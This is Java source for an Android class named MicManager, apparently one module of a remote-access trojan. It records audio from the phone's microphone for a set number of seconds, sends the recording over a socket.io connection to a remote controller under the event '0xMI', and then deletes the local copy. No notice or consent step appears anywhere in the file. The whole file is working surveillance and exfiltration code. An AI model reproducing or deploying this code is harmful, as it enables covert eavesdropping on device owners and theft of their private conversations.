package com.remote.app.Managers;

import android.media.MediaRecorder;
import android.util.Log;

import com.remote.app.IOSocket;
import com.remote.app.MainService;
import com.remote.app.TypeOpenFile;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public  class MicManager {


    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;


    public static void startRecording(int sec) throws Exception {
        if(MainService.isRecording==true)
            return;

        //Creating file
        File dir = MainService.getContextOfApplication().getCacheDir();
        Log.e("DIRR" , dir.getAbsolutePath());
        audiofile = MainService.OpenFile(TypeOpenFile.RecordMic);


        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        recorder.prepare();
        recorder.start();

        MainService.isRecording = true;


        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                MainService.isRecording = false;
                recorder.stop();
                recorder.release();
                sendVoice(audiofile);
                //audiofile.delete();
            }
        };

        new Timer().schedule(stopRecording, sec*1000);
    }

    private static void sendVoice(File file){

        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file",true);
            object.put("name",file.getName());
            object.put("buffer" , data);
            try{
                IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
                file.delete();
            }catch (Exception e){}
            buf.close();

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

}

